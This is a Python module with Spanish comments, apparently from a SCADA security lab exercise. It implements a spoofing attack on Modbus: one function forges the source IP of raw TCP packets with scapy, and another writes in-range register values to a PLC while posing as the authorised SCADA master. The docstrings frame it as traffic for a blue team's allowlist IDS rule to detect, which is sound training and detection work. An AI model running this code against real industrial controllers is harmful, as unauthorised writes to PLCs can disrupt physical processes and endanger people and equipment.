"""Ataque de spoofing / maestro suplantado (Bloque D, Paso 16).

Dos implementaciones de la misma idea — un atacante que se hace pasar por un
maestro SCADA autorizado:

  - `enviar_paquete_spoofed` (scapy): falsifica la IP origen a nivel de paquete
    crudo. Requiere Npcap (Windows) / root (Linux). Es spoofing en su forma más
    pura, pero al no completar handshake TCP inyecta a ciegas.
  - `escribir_como_maestro_suplantado` (portable): abre una sesión Modbus real
    y manda un comando de control con un valor perfectamente VÁLIDO (en rango),
    como lo mandaría el HMI legítimo. El engaño no está en el valor sino en el
    origen no autorizado; por eso lo caza la regla de allowlist del IDS
    (R-ALLOW-001), no la de rango. No usa scapy ni privilegios.
"""

from pymodbus.client import AsyncModbusTcpClient

PUERTO_MODBUS = 502


def enviar_paquete_spoofed(
    ip_origen_falsa: str, ip_destino: str, puerto_destino: int = PUERTO_MODBUS, payload: bytes = b""
) -> None:
    """Envía un paquete TCP a `ip_destino:puerto_destino` con la IP origen
    falsificada como `ip_origen_falsa`.

    Nota técnica: al no completarse un handshake TCP real (la respuesta del
    destino iría a `ip_origen_falsa`, no al atacante), esto sirve para
    inyectar tráfico a ciegas — no para sostener una sesión Modbus
    bidireccional real. Es la técnica de spoofing en su forma más simple,
    suficiente para que el blue team la detecte por IP fuera de whitelist.
    """
    from scapy.all import IP, TCP, Raw, send

    paquete = (
        IP(src=ip_origen_falsa, dst=ip_destino)
        / TCP(dport=puerto_destino, flags="PA")
        / Raw(load=payload)
    )
    send(paquete, verbose=0)


async def escribir_como_maestro_suplantado(
    host: str, puerto: int, direccion: int, valor: int, slave: int = 1
) -> bool:
    """Versión portable: escribe un valor VÁLIDO (en rango) vía cliente Modbus
    real, haciéndose pasar por el maestro SCADA autorizado.

    A diferencia de la escritura ilegítima (valor fuera de rango), acá el
    comando es indistinguible de uno legítimo por su contenido: lo único
    anómalo es el origen. Devuelve True si el PLC aceptó la escritura.
    """
    client = AsyncModbusTcpClient(host, port=puerto)
    await client.connect()
    try:
        respuesta = await client.write_register(address=direccion, value=valor, slave=slave)
        return not respuesta.isError()
    finally:
        client.close()
